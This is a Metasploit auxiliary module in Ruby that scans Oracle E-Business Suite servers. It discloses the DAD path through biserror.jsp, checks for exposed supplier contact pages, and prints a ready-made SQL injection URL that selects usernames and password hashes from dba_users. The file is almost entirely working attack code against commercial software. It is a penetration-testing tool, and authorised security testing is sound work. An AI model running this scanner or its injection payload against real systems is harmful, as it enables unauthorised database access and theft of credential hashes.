##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##
#######################oracle_ebusiness_suite_sqli############################

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report	
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner
	def initialize
		super(
			'Name'        => 'Oracle E-Business Suite SQL Injection 11.5.1-11.5.10.2.(R12)',
			'Description' => %q{
					This module makes a request to the Oracle Application Server (tested against Oracle HRMS [self service])
					 in an attempt to find some of the vulnerabilities described by Joxean Koret. It will also try to find DAD to be used with /pls/
			},
			'Version'     => '$Revision$',
			'References'  =>
				[
					[ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuapr2010.html' 
],
				],
			'Author'      => [ 'KP' ],
			'License'     => MSF_LICENSE
		)

		register_options([Opt::RPORT(8000),], self.class)
	end
	def run_host(ip)
		begin
			finddad = send_request_raw({
				'uri'     => '/OA_HTML/biserror.jsp?DBC=DOESNOTEXIST',
				'method'  => 'GET',
				'version' => '1.1',
			}, 5)
		
			if ( finddad.body =~ /pls/ )
				sleep(2)
				tempdad = finddad.body.scan(/\/pls\/(.*)\//)
					report_note(
							:host	=> ip,
							:proto	=> 'tcp',
							:type	=> 'SERVICE_NAME',
							:data	=> "#{tempdad.uniq}"
					)
				tempdad1 = $1
				tempdad2 = tempdad1.split("/")
				finaldad = tempdad2.first
				print_status("Discovered DAD: '#{finaldad}' for host #{ip}")
			else
				print_error("Unable to retrieve DAD for #{ip}...")
			end
			supplieruri = "/pls/#{finaldad}/ICXSUPWF.DISPLAYCONTACTS"
			print_status ("Looking for supplier infor at '#{supplieruri}'")
			findsupplier = send_request_raw({
					'uri' => "#{supplieruri}",
					'method' => 'GET',
					'version' => '1.1',
			}, 5)
			if ((findsupplier.body =~ /Supplier Contacts/) && (findsupplier.body =~ /Company Address/))
				sleep(2)
				print_status("Supplier contacts found on '#{supplieruri}'")
				print_status("Find password hashes on 
'#{supplieruri}'?p_where=2>1%20union%20select%20username,password,null,null,null,null%20from%20dba_users;")
			else
				print_error("Supplier info not found")
			end
			
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
end
